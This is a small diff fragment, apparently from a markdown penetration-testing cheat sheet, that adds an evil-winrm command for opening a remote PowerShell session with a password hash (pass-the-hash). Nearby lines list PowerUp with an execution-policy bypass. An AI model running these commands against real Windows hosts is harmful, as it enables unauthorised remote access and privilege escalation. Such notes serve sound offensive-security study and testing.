@@ -77,6 +77,8 @@
 ```
 #### Tools
 ```
+- Powershell session
+  - evil-winrm -i 10.10.10.10 -u username -H hash
 - PowerUp
   - powershell -ep bypass
   - import powerup
